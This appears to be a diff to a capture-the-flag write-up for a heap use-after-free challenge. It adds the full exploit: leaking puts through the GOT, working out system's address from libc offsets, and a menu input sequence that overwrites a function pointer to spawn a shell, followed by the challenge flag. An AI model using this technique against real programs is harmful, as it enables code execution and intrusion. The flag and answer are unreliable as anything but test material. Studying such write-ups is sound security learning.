@@ -205,24 +205,41 @@ second chunk will be the note content. Specifically we need to manuevere allocat
 the same address as the functpr.
 
 To beat ASLR and pop shell a leak is required for the address to system. Once again abusing UAF, Note 0 can be set so that
-the funcptr to print is the same while content is set to puts@GOT
+the funcptr to print is the same while content is set to puts@GOT. This will leak the actual runtime address of the puts function
+in libc. Using this with known offsets in libc, we can find the address of system
+
 0804a024 puts@GLIBC_2.0
 0804862b print funcptr
+$ readelf -s libc.so.6 | grep puts
+   434: 0005f140   464 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.0
+$ readelf -s libc.so.6 | grep system
+  1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
+libc_base = leak - 0x5f140
+system_addr = libc_base + 0x3a940
 
-Input
-1
+Exploit:
+1                             // Add Note 0
 16
 AAAA
-1
+1                             // Add Note 1
 16
 BBBB
-2
+2                             // Delete Note 0
 0
-2
+2                             // Delete Note 1
 1
-1
+1                             // Add Note 2
 8
-\x2b\x86\x04\x08\x24\xa0\x04\x08
-3
+<print funcptr> <puts@GOT>
+3                             // Print Note 0 (Leak puts addr)
 0 
+2                             // Delete Note 2 
+2
+1                             // Add Note 3 (overwrite functpr to system and pop shell)
+8
+<system_addr> <;sh;>
+3                             // Print Note 0 (Pops shell)
+0
 
+
+FLAG{Us3_aft3r_fl3333_in_h4ck_not3}
